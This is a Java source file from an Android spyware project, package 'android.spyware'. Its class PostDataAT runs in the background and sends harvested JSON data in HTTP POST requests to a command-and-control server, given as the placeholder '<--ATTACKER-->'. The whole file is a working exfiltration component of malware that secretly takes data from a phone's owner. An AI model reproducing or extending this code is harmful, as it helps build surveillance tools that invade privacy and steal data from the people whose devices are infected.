package android.spyware;

import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;

/**
 * This asynchronus task is in charge of posting the json data to the CC.
 */
class Param {
    private String action;
    private JSONArray jArray = null;
    private JSONObject jObject = null;

    public Param(String action, JSONArray jArray) {
        this.action = action;
        this.jArray = jArray;
    }

    public Param(String action, JSONObject jObject) {
        this.action = action;
        this.jObject = jObject;
    }

    protected String getAction() {
        return action;
    }

    protected JSONArray getJArray() {
        return jArray;
    }

    protected JSONObject getJObject() {
        return jObject;
    }

    protected boolean isJArray() {
        return jArray instanceof JSONArray;
    }
}

public class PostDataAT extends AsyncTask<Param, Void, Integer> {

    @Override
    protected Integer doInBackground(Param... params) {
        HttpURLConnection con = null;
        DataOutputStream out = null;

        try {
            String action = params[0].getAction();
            String data;

            if (params[0].isJArray())
                data = params[0].getJArray().toString();
            else
                data = params[0].getJObject().toString();

            URL url = new URL("<--ATTACKER-->");
            String request = new Uri.Builder()
                    .appendQueryParameter("action", action)
                    .appendQueryParameter("data", data)
                    .build().getEncodedQuery();

            con = (HttpURLConnection) url.openConnection();
            con.setDoInput(true);
            con.setDoOutput(true);

            // HTTP headers
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
            con.setRequestProperty("X-Requested-With", "XMLHttpRequest");
            con.setFixedLengthStreamingMode(request.getBytes().length);

            con.connect();

            // Sending data
            out = new DataOutputStream(con.getOutputStream());
            out.writeBytes(request);
            out.flush();

            if (DEV_MODE)
                Log.d(TAG, "::DEB  Post data:" + data);

            // Receiving data
            String responseCode = String.valueOf(con.getResponseCode()) + " | " + con.getResponseMessage();

            if (DEV_MODE)
                Log.d(TAG, "::DEB  Response code: " + responseCode);

            return (con.getResponseCode());
        } catch (IOException e) {
            if (DEV_MODE)
                Log.wtf(TAG, "::ERR  " + Log.getStackTraceString(e));
        } finally {
            if (con != null)
                con.disconnect();
            if (out != null)
                try {
                    out.close();
                } catch (IOException e) {
                    Log.wtf(TAG, "::ERR  " + Log.getStackTraceString(e));
                }
        }

        return null;
    }

    protected int onPostExecute(int responseCode) {
        return responseCode;
    }
}